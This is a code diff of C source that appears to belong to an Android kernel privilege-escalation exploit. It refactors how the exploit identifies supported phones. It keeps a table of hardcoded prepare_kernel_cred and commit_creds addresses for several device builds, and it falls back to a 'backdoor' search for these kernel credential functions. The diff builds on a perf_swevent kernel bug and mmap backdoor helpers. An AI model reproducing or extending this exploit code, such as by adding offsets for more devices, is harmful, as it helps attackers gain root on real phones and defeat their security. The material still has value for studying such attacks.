@@ -1,7 +1,6 @@
 #include <errno.h>
 #include <stdio.h>
 #include <string.h>
-#include <sys/system_properties.h>
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <unistd.h>
@@ -9,6 +8,7 @@
 #include <fcntl.h>
 #include <sys/mman.h>
 
+#include "detect_device.h"
 #include "cred.h"
 #include "mm.h"
 #include "perf_swevent.h"
@@ -18,17 +18,16 @@
 #include "backdoor_mmap.h"
 
 typedef struct _supported_device {
-  const char *device;
-  const char *build_id;
+  int device_id;
   unsigned long int prepare_kernel_cred_address;
   unsigned long int commit_creds_address;
 } supported_device;
 
 static supported_device supported_devices[] = {
-  { "IS17SH", "01.00.04",    0xc01c66a8, 0xc01c5fd8 },
-  { "SH-04E", "01.00.02",    0xc008d86c, 0xc008d398 },
-  { "SOL21",  "9.1.D.0.395", 0xc0098584, 0xc00980a8 },
-  { "HTL21",  "JRO03C",      0xc00ab9d8, 0xc00ab4c4 },
+  { DEV_IS17SH_01_00_04,   0xc01c66a8, 0xc01c5fd8 },
+  { DEV_SH04E_01_00_02,    0xc008d86c, 0xc008d398 },
+  { DEV_SOL21_9_1_D_0_395, 0xc0098584, 0xc00980a8 },
+  { DEV_HTL21_JRO03C,      0xc00ab9d8, 0xc00ab4c4 },
 };
 
 static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);
@@ -36,27 +35,24 @@ static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_de
 static bool
 get_creds_functions_addresses(void **prepare_kernel_cred_address, void **commit_creds_address)
 {
+  int device_id = detect_device();
   int i;
-  char device[PROP_VALUE_MAX];
-  char build_id[PROP_VALUE_MAX];
-
-  __system_property_get("ro.product.model", device);
-  __system_property_get("ro.build.display.id", build_id);
 
   for (i = 0; i < n_supported_devices; i++) {
-    if (!strcmp(device, supported_devices[i].device) &&
-        !strcmp(build_id, supported_devices[i].build_id)) {
-      if (prepare_kernel_cred_address) {
-        *prepare_kernel_cred_address = (void*)supported_devices[i].prepare_kernel_cred_address;
-      }
-      if (commit_creds_address) {
-        *commit_creds_address = (void*)supported_devices[i].commit_creds_address;
-      }
-      return true;
+    if (supported_devices[i].device_id != device_id) {
+      continue;
     }
-  }
 
-  printf("%s (%s) is not supported.\n", device, build_id);
+    if (prepare_kernel_cred_address) {
+      *prepare_kernel_cred_address = (void*)supported_devices[i].prepare_kernel_cred_address;
+    }
+
+    if (commit_creds_address) {
+      *commit_creds_address = (void*)supported_devices[i].commit_creds_address;
+    }
+
+    return true;
+  }
 
   return false;
 }
@@ -128,6 +124,11 @@ setup_creds_functions(void)
     return true;
   }
 
-  return find_creds_functions_with_backdoor();
+  if (find_creds_functions_with_backdoor()) {
+    return true;
+  }
+
+  print_reason_device_not_supported();
+  return false;
 }
 
